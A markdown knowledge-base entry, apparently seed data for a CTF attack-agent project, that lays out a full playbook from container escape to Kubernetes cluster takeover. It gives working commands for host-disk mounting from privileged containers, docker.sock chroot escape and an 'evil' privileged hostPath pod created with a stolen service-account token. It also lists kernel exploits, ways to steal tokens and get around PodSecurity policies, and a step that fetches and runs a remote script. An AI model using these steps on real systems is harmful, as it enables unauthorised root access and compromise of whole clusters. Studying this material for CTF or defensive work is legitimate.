# [Seed] Container Escape → Host Root Access (cap_sys_admin / Privileged Container / docker.sock)

## Scenario Classification
Penetration Testing / Cloud Native / Container Security

## Target Overview
Gained shell access inside a container (via application vulnerability / exposed Jenkins / RCE on K8s); need to escape from container to host, then laterally compromise the entire K8s cluster.

## Full Execution Chain

1. Reconnaissance immediately upon entering container:
   ```bash
   id                                    # Root user check
   cat /proc/self/status | grep CapEff   # Inspect capabilities
   capsh --print                         # Friendlier view of above
   ls -la /var/run/docker.sock           # Is Docker socket mounted?
   mount | grep -v proc                  # Inspect mounted host directories
   cat /proc/1/cgroup                    # Docker / containerd / kubepods?
   env | grep -i 'kube\|docker\|aws\|az' # Service accounts / metadata tokens
   ls /var/run/secrets/kubernetes.io/serviceaccount/  # K8s SA token
   ```
2. Select escape path based on detection results:

   **Path A: Privileged Container (`--privileged`)**
   ```bash
   # Mount host disk directly
   mkdir /host && mount /dev/sda1 /host
   chroot /host
   # Now you are host root
   ```

   **Path B: cap_sys_admin / cap_dac_read_search**
   ```bash
   # Exploit release_agent bypass (CVE-2022-0492 class)
   # Exploit cap_sys_admin to mount directly
   ```

   **Path C: Mounted docker.sock**
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host bash
   ```

   **Path D: K8s SA Token with Excessive Permissions**
   ```bash
   TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
   kubectl --token=$TOKEN auth can-i --list
   # If pod creation is allowed → Spawn a privileged pod using hostPID/hostNetwork/hostPath to escape
   ```

   **Path E: Kernel Exploit (Dirty Pipe / Dirty COW / OverlayFS)**
   ```bash
   uname -a               # Inspect kernel version
   # Select corresponding off-the-shelf exploit for CVE
   ```

3. Post-escape: Find next hop on host
   - Kubelet credentials (/var/lib/kubelet)
   - Container runtime sockets (containerd / dockerd)
   - Tokens from other pods
   - hostNetwork → Direct connection to all cluster service IPs
4. Pivot across the entire K8s cluster

## Pitfall Log

| Problem | Cause | Solution | Time Spent |
|---------|-------|----------|------------|
| Container is non-root, capabilities empty | Strong application-layer hardening | Search for setuid binaries / kernel vulnerabilities / external container vulnerabilities | Hours |
| Discovered docker.sock but unreadable | Sock owned by root:root 660 | Add current UID to docker group (if setgid program exists) or abuse another container | 30min |
| Spawned privileged pod but image download failed | Intranet cluster, private docker registry | Use existing images within cluster (pick any under kube-system) | 20min |
| K8s SA token lacks permission | Default SA usually default/restricted | Try listing pods → find pod with cluster-admin → steal its SA token | 1h |
| Missing standard tools after chroot | Host is a minimal distribution | Mount /proc /dev /sys before chroot; or operate /host directly from original namespace | 30min |
| Cluster uses PodSecurity Standards | Restricted policy forbids hostPath / privileged | Check for relaxed namespace admission configurations; search for SA with deployment creation rights | Hours |

## Toolchain Findings

- **deepce**: Automated container escape scanner (single shell script, zero dependencies)
- **kdigger**: Kubernetes/container reconnaissance tool, outputs structured results
- **peirates**: Dedicated TUI for K8s penetration testing
- **kube-hunter**: Developed by Aqua, scans cluster security issues
- **botb (break out the box)**: Established container escape tool
- **cdk**: Container penetration Swiss army knife (covers cloud vendor scenarios)

## Critical Code / Commands

One-liner self-check:

```bash
# Fetch deepce (zero dependencies)
wget https://github.com/stealthcopter/deepce/raw/main/deepce.sh
chmod +x deepce.sh
./deepce.sh
# Output: N escape paths detected
```

Escape via K8s SA token by spawning a privileged pod:

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

# Inspect permissions
curl -sk --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -d '{"spec":{"namespace":"default"}}'

# If pod creation is allowed, mount host via hostPath
cat <<EOF > evil-pod.yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh","-c","sleep 999999"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

curl -sk --header "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST $APISERVER/api/v1/namespaces/default/pods \
  --data-binary @evil-pod.yaml

# Exec into evil pod, chroot /host
```

CVE-2022-0492 Exploitation (cap_sys_admin + missing user namespace):

```bash
# Reference: https://github.com/PaloAltoNetworks/cve-2022-0492
# Core: Mount cgroup → Write release_agent → Trigger empty cgroup → Execute in host context
```

## Recommendations for Improvement

- `CTF-Sandbox-Orchestrator/competition-agent-cloud/` exists; recommend adding `references/k8s-attack-paths.md`
- Add complete "container escape → cluster takeover" path example to attack-chain
- Add deepce / kdigger / peirates to bootstrap-manifest

## Reusable Patterns & Script Snippets

**Container Escape 5-Path Quick Reference**:

```text
1. Privileged Container     → mount /dev/sda1 /host && chroot /host
2. cap_sys_admin           → CVE-2022-0492 (release_agent) / Custom cgroup mount
3. docker.sock             → docker run -v /:/host alpine chroot /host
4. K8s SA + Permission     → Spawn hostPath/privileged pod
5. Kernel CVE              → DirtyPipe (CVE-2022-0847) / DirtyCred (CVE-2022-2588) / OverlayFS (CVE-2023-0386)
```

**Must-Check After Escape**:

```text
- /var/lib/kubelet/pods/        → Steal SA tokens of other pods
- /var/lib/docker/              → Inspect running containers
- ip addr                        → Access service IPs directly via hostNetwork
- crictl ps                      → containerd container list
- ps -ef --forest                → Find kubelet / dockerd startup parameters (including tokens)
```

## Evolution Actions
- [ ] Add k8s-attack-paths.md to CTF-Sandbox-Orchestrator/competition-agent-cloud
- [ ] Add container escape → cluster takeover path to attack-chain
- [ ] Add deepce/kdigger/peirates to bootstrap-manifest

## Environment Info
- Attack Position: Inside container (any shell entrypoint works)
- Target: K8s 1.24+ / Docker 20+ / containerd 1.6+
- Kernel: Depends on target; focus on CVE-2022-0492 / CVE-2022-0847 / CVE-2023-0386 time windows

## Sanitisation Requirements
This entry is seed data based on public container/K8s security research; no real clusters involved.

---
<!-- [Evolution Stats] Total Projects Completed: 1 | New Patterns Added: 2 | Toolchain Issues Fixed: 0 -->
<!-- [Community Contribution] Seed data, no PR needed -->
